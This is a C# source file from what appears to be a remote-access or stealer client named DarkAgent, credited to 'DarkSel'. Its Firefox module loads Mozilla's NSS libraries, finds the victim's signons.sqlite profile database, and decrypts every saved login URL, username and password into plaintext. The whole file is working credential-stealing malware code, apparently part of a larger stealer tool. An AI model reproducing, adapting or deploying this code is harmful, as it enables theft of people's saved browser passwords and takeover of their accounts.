using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Data;
using DarkAgent_Client.src.Network;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;
using DarkAgent_Client.src.Objects;
using System.Windows.Forms;

namespace DarkAgent_Client.src.Features.Stealers.Firefox
{
    class Firefox
    {
        //Firefox 3.5 and 3.6 Decryptor
        //Coded by DarkSel
        //Email and MSN: darksel.ltd@live.com

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr NSS3;
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string configdir);
        public static long NSS_Init(string configdir)
        {
            string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            LoadLibrary(MozillaPath + "mozcrt19.dll");
            LoadLibrary(MozillaPath + "nspr4.dll");
            LoadLibrary(MozillaPath + "plc4.dll");
            LoadLibrary(MozillaPath + "plds4.dll");
            LoadLibrary(MozillaPath + "ssutil3.dll");
            LoadLibrary(MozillaPath + "sqlite3.dll");
            LoadLibrary(MozillaPath + "nssutil3.dll");
            LoadLibrary(MozillaPath + "softokn3.dll");
            NSS3 = LoadLibrary(MozillaPath + "nss3.dll");
            IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
            return dll(configdir);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate2();
        public static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_GetInternalKeySlot");
            DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate2));
            return dll();
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11_Authenticate");
            DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(NSS3, "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }

        public static string signon;
        public static List<PasswordInfo> GetFirefoxPasswords()
        {
            if ((IntPtr.Size * 8) == 64)
                return new List<PasswordInfo>();


            bool FoundFile = false;
            long KeySlot = 0;
            string MozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            string DefaultPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";
            string[] Dirs = Directory.GetDirectories(DefaultPath);
            foreach (string dir in Dirs)
            {
                if (!FoundFile)
                {
                    string[] Files = Directory.GetFiles(dir);
                    foreach (string CurrFile in Files)
                    {
                        if (!FoundFile)
                        {
                            if (System.Text.RegularExpressions.Regex.IsMatch(CurrFile, "signons.sqlite"))
                            {
                                NSS_Init(dir);
                                signon = CurrFile;
                            }
                        }
                        else
                            break;
                    }
                }
                else
                    break;
            }

            string dataSource = signon;
            TSECItem tSecDec = new TSECItem();
            TSECItem tSecDec2 = new TSECItem();
            byte[] bvRet;
            SQLiteBase db = new SQLiteBase(dataSource);

            DataTable table = db.ExecuteQuery("SELECT * FROM moz_logins;");
            DataTable table2 = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;");

            KeySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(KeySlot, true, 0);

            List<PasswordInfo> passwords = new List<PasswordInfo>();
            foreach (System.Data.DataRow Zeile in table.Rows)
            {
                PasswordInfo info = new PasswordInfo();
                info.URL = System.Convert.ToString(Zeile["formSubmitURL"].ToString());

                StringBuilder se = new StringBuilder(Zeile["encryptedUsername"].ToString());
                int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
                TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                        info.Username = System.Text.Encoding.ASCII.GetString(bvRet);
                    }
                }
                StringBuilder se2 = new StringBuilder(Zeile["encryptedPassword"].ToString());
                int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
                TSECItem item2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TSECItem));
                if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
                {
                    if (tSecDec2.SECItemLen != 0)
                    {
                        bvRet = new byte[tSecDec2.SECItemLen];
                        Marshal.Copy(new IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen);
                        info.Password = System.Text.Encoding.ASCII.GetString(bvRet);
                    }
                }

                passwords.Add(info);
            }
            return passwords;
        }
    }
}